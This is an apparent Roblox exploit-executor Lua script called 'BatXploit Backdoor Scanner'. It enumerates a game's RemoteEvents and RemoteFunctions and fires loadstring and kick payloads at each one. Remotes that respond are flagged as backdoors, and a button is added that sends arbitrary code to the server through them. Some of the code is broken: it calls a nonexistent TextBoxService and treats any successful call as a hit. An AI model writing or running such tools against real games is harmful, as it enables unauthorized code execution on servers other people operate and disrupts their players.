-- █████▄  ▄▄▄ ▄▄▄▄▄▄ ██  ██ ▄▄▄▄  ▄▄     ▄▄▄  ▄▄ ▄▄▄▄▄▄   ██      ▄▄▄   ▄▄▄  ▄▄▄▄  ▄▄▄▄▄ ▄▄▄▄   ██   ██████ ▄▄  ▄▄   ▄▄  ▄▄▄  ▄▄ ▄▄   ▀█▄ 
-- ██▄▄██ ██▀██  ██    ████  ██▄█▀ ██    ██▀██ ██   ██     ██     ██▀██ ██▀██ ██▀██ ██▄▄  ██▀██  ██   ██▄▄   ███▄██   ██ ██▀██ ▀███▀ ▀  ██ 
-- ██▄▄█▀ ██▀██  ██   ██  ██ ██    ██▄▄▄ ▀███▀ ██   ██     ██████ ▀███▀ ██▀██ ████▀ ██▄▄▄ ████▀  ▄▄   ██▄▄▄▄ ██ ▀██ ▄▄█▀ ▀███▀   █   ▄ ▄█▀ 
print("BatXploit Advanced Backdoor Scanner v1.0")

-- Создаём GUI для сканера
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "BackdoorScanner"
screenGui.Parent = game:GetService("CoreGui")
screenGui.ResetOnSpawn = false

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 500, 0, 600)
mainFrame.Position = UDim2.new(0.5, -250, 0.5, -300)
mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
mainFrame.BackgroundTransparency = 0.1
mainFrame.BorderSizePixel = 2
mainFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = screenGui

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
title.Text = "BatXploit Backdoor Scanner"
title.TextColor3 = Color3.fromRGB(255, 0, 0)
title.Font = Enum.Font.SourceSansBold
title.TextSize = 18
title.Parent = mainFrame

local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, -20, 0, 30)
statusLabel.Position = UDim2.new(0, 10, 0, 50)
statusLabel.Text = "Status: Idle"
statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
statusLabel.TextXAlignment = Enum.TextXAlignment.Left
statusLabel.Parent = mainFrame

local scanBtn = Instance.new("TextButton")
scanBtn.Size = UDim2.new(0, 150, 0, 35)
scanBtn.Position = UDim2.new(0, 10, 0, 90)
scanBtn.Text = "Start Scan"
scanBtn.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
scanBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
scanBtn.BorderSizePixel = 1
scanBtn.BorderColor3 = Color3.fromRGB(255, 0, 0)
scanBtn.Parent = mainFrame

local clearBtn = Instance.new("TextButton")
clearBtn.Size = UDim2.new(0, 150, 0, 35)
clearBtn.Position = UDim2.new(0, 170, 0, 90)
clearBtn.Text = "Clear Results"
clearBtn.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
clearBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
clearBtn.BorderSizePixel = 1
clearBtn.BorderColor3 = Color3.fromRGB(255, 0, 0)
clearBtn.Parent = mainFrame

local resultFrame = Instance.new("ScrollingFrame")
resultFrame.Size = UDim2.new(1, -20, 0, 420)
resultFrame.Position = UDim2.new(0, 10, 0, 135)
resultFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
resultFrame.BorderSizePixel = 1
resultFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
resultFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
resultFrame.ScrollBarThickness = 8
resultFrame.Parent = mainFrame

local resultLayout = Instance.new("UIListLayout")
resultLayout.Padding = UDim.new(0, 5)
resultLayout.Parent = resultFrame

-- Продвинутый сканер
local backdoors = {}
local scannedRemotes = 0

local function addResult(text, color)
    local label = Instance.new("TextLabel")
    label.Text = text
    label.TextColor3 = color or Color3.fromRGB(255, 255, 255)
    label.TextSize = 12
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.TextWrapped = true
    label.Size = UDim2.new(1, -10, 0, 20)
    label.BackgroundTransparency = 1
    label.Parent = resultFrame
    
    -- Обновляем CanvasSize
    task.wait()
    resultFrame.CanvasSize = UDim2.new(0, 0, 0, resultLayout.AbsoluteContentSize.Y)
end

local function analyzeScript(script, remotePath)
    local success, bytecode = pcall(function()
        return getscriptbytecode(script) or getscriptclosure(script)
    end)
    
    if not success then return false end
    
    local patterns = {
        "loadstring", "getfenv", "setfenv", "getrenv", "shared", "_G",
        "pcall", "spawn", "delay", "task.spawn", "coroutine.wrap",
        "require", "getgenv", "getsenv", "getfenv", "setfenv"
    }
    
    local found = false
    local source = tostring(bytecode)
    
    for _, pattern in ipairs(patterns) do
        if source:find(pattern) then
            addResult("[!] Suspicious pattern '" .. pattern .. "' found in " .. remotePath, Color3.fromRGB(255, 100, 0))
            found = true
        end
    end
    
    return found
end

local function testRemote(remote)
    local success, result = pcall(function()
        if remote:IsA("RemoteEvent") then
            remote:FireServer("print('BatXploit backdoor test')")
            remote:FireServer("loadstring('print(\\'test\\')')()")
            remote:FireServer("game:GetService('Players').LocalPlayer:Kick('test')")
        elseif remote:IsA("RemoteFunction") then
            remote:InvokeServer("test")
        end
    end)
    
    return success
end

local function scanRemotes()
    scannedRemotes = 0
    backdoors = {}
    
    local allRemotes = {}
    for _, obj in ipairs(game:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            table.insert(allRemotes, obj)
        end
    end
    
    addResult("[*] Found " .. #allRemotes .. " remotes to scan", Color3.fromRGB(255, 255, 0))
    
    for _, remote in ipairs(allRemotes) do
        scannedRemotes = scannedRemotes + 1
        statusLabel.Text = "Status: Scanning " .. scannedRemotes .. "/" .. #allRemotes
        
        local remotePath = remote:GetFullName()
        local isVulnerable = false
        
        -- Проверяем скрипты, связанные с remote
        local script = remote.Parent and remote.Parent:FindFirstChildWhichIsA("Script")
        if script then
            if analyzeScript(script, remotePath) then
                isVulnerable = true
            end
        end
        
        -- Пытаемся вызвать remote
        if testRemote(remote) then
            addResult("[!] Remote " .. remotePath .. " responded to test", Color3.fromRGB(255, 50, 50))
            isVulnerable = true
        end
        
        if isVulnerable then
            table.insert(backdoors, remote)
            addResult("[CRITICAL] Potential backdoor found: " .. remotePath, Color3.fromRGB(255, 0, 0))
            
            -- Добавляем кнопку для выполнения кода
            local execBtn = Instance.new("TextButton")
            execBtn.Text = "Execute on " .. remote.Name
            execBtn.Size = UDim2.new(0, 150, 0, 20)
            execBtn.Position = UDim2.new(1, -160, 0, 0)
            execBtn.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
            execBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
            execBtn.BorderSizePixel = 1
            execBtn.BorderColor3 = Color3.fromRGB(255, 0, 0)
            execBtn.Parent = resultFrame.Controls[#resultFrame.Controls]
            
            local execRemote = remote
            execBtn.MouseButton1Click:Connect(function()
                local code = game:GetService("TextBoxService"):GetText() -- placeholder
                pcall(function()
                    if execRemote:IsA("RemoteEvent") then
                        execRemote:FireServer(code)
                    else
                        execRemote:InvokeServer(code)
                    end
                end)
            end)
        end
        
        task.wait()
    end
    
    statusLabel.Text = "Status: Scan complete. Found " .. #backdoors .. " potential backdoors"
    addResult("[*] Scan completed! Found " .. #backdoors .. " potential backdoors", Color3.fromRGB(0, 255, 0))
end

scanBtn.MouseButton1Click:Connect(scanRemotes)
clearBtn.MouseButton1Click:Connect(function()
    for _, child in ipairs(resultFrame:GetChildren()) do
        if child:IsA("TextLabel") then
            child:Destroy()
        end
    end
    addResult("[*] Results cleared", Color3.fromRGB(255, 255, 0))
end)

-- Уведомление
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "BatXploit",
    Text = "Backdoor Scanner loaded! Click Start Scan",
    Duration = 4
})
